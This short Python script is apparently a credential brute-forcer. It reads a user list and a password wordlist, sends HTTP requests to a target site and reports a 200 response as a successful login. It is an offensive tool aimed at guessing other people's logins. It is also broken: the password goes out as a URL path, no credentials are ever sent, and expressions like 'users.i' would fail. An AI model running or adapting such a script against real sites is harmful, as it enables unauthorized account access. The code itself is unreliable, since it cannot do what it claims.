import http.client
target = input('Print target site: ')
userlist = input('Set path to userlist: ')
with open(userlist) as u:
    users = u.readlines()
users = [x.strip("\n") for x in users]
passlist = input('Set path to wordlist: ')
with open(passlist) as f:
    content = f.readlines()
content = [x.strip("\n") for x in content]
fort = []
i=0
for i in content:
    conn = http.client.HTTPConnection(target)
    conn.request("GET", i)
    send = conn.getresponse()
    status = send.status
    print("Connecting " + target + "With user: " + users.i + " and password: " + content.i)
    if status == 200:
        print('Successful attempt!')
        fort.append(users.i + content.i)
print("Found: " + users.i + " - " + content.i)
